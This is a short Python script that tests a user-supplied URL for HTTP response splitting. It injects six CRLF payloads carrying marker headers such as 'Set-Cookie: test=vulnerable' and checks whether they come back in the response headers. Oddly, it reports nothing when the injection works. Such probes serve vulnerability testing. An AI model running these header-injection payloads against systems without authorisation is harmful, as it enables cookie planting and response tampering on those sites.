import urllib.request
import urllib.parse
import sys

def test_response_splitting(url_template):
    payloads = [
        "%0d%0aSet-Cookie: test=vulnerable",
        "%0a%0dSet-Cookie: test=vulnerable", 
        "\r\nSet-Cookie: test=vulnerable",
        "\n\rSet-Cookie: test=vulnerable",
        "%0d%0aX-Injected: vulnerable%0d%0a",
        "\r\nX-Injected: vulnerable\r\n"
    ]
    
    for payload in payloads:
        try:
            url = url_template.replace("{INJECT}", payload)
            
            request = urllib.request.Request(url)
            response = urllib.request.urlopen(request)
            
            headers = response.info()
            response_headers = str(headers).lower()
            
            if "set-cookie: test=vulnerable" in response_headers or "x-injected: vulnerable" in response_headers:
                return
                
        except Exception:
            continue

if __name__ == "__main__":
    url_template = input().strip()
    print("Testing")
    test_response_splitting(url_template)